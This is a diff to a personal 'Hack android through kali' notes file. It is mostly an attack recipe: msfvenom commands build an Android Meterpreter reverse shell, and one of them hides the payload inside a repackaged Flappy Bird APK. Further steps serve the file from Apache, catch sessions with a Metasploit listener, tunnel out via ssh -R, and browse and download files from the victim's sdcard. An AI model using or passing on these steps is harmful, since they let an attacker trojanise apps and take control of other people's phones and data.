@@ -1,13 +1,33 @@
 Hack android through kali
 -----------------------------------------
+note - should be on same network
+-----------------------------------------
 terminal - 1
 sudo su
 ip a
 
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.162 LPORT=8080 > test.apk
-firefox  https://web.whatsapp.com/ 
+or
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.162 LPORT=2222 -o test.apk
+or
+msfvenom -x flappy_bird-v1-3.apk -p android/meterpreter/reverse_tcp LHOST=192.168.176.162 LPORT=2222 -o flappy_bird_v.apk
+or
+msfvenom -x flappy_bird-v1-3.apk -p android/meterpreter/reverse_tcp LHOST=192.168.176.162 LPORT=5555 -o flappy_bird_v.apk
+----------------------------
+sudo apt  install apache2 
+service apache2 start
+service apache2 status
 ls
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.176.162 LPORT=8080 > test.apk
+mv filename.apk /var/www/html
+
+------------------------
+
+firefox  https://web.whatsapp.com/ 
+
+ls
+-----------------------------------------------------------------------------------------
+use Metasploit as listener 
+-----------------------------------------------------------------------------------------
 msfconsole 
 -----------------------------------------------------------------------------------------
 1   
@@ -17,17 +37,47 @@ set payload android/meterpreter/reverse_tcp
 3   
 show options
 4   
-set LHOSTS 192.168.176.162
+set LHOST 192.168.176.164
 5   
 set LPORT 8080
+or
+set LPort 2222
 6  
 set ExitOnSession False
 7   
 exploit -j
-
+or 
+exploit 
+or 
+run
+..     ,,   ...
+7.0
+ssh-keygen
+7.1
+ssh -R 80:ip:8080 ip.run
 --------------------------------------------------
-  history
-------------------------------------------------------------------------------------------------------------------------------------------
+8
+help
+sysinfo
+9
+pwd
+10
+cd
+11
+cd /
+12
+sdcard
+13
+Download filename
+14
+help
+---------------------------------------------------------------------------------------------------------------------------------
+or
+---------
+sessions -i
+session -i  1
+help
+
 ================================================================================
 0.
 ip a
@@ -273,5 +323,8 @@ https://www.youtube.com/watch?v=ksUylvdJQDQ
 https://www.youtube.com/watch?v=wDwhxPwpznE
 ---------
 https://www.youtube.com/watch?v=jqkR5InC_Fg
------------
+---------
 https://www.youtube.com/watch?v=pszDrYo0k3w
+--------
+https://www.youtube.com/watch?v=9SgZ4guc2Q0
+--------
